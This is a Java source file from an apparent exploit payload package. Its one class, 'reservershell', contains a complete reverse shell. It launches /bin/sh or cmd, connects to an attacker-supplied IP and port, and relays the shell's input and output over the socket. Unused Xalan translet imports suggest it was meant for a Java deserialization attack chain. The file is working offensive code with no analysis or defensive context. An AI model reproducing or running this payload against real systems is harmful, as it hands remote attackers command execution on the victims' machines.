package com.example.frchannel.payload;



import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.Socket;

public class reservershell  {
    public static void start(String ip,String port) {
//        System.err.println("reserver to : "+ip);
        try {
            String cmd;
            if (File.separator.equals("/")) {
                cmd = "/bin/sh";
            } else {
                cmd = "cmd";
            }
            Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
            Socket s = new Socket(ip, Integer.parseInt(port));
            InputStream pi = p.getInputStream();
            InputStream pe = p.getErrorStream();
            InputStream si = s.getInputStream();
            OutputStream po = p.getOutputStream();
            OutputStream so = s.getOutputStream();
            boolean n = false;

            while(!s.isClosed()) {
                if (!n) {
                    so.write(0);
                }

                n = true;

                while(pi.available() > 0) {
                    so.write(pi.read());
                }

                while(pe.available() > 0) {
                    so.write(pe.read());
                }

                while(si.available() > 0) {
                    po.write(si.read());
                }

                so.flush();
                po.flush();
                Thread.sleep(50L);

                try {
                    p.exitValue();
                    break;
                } catch (Exception var10) {
                }
            }

            p.destroy();
            s.close();
        } catch (Exception var11) {
            Exception e = var11;
            e.printStackTrace();
        }

    }

}
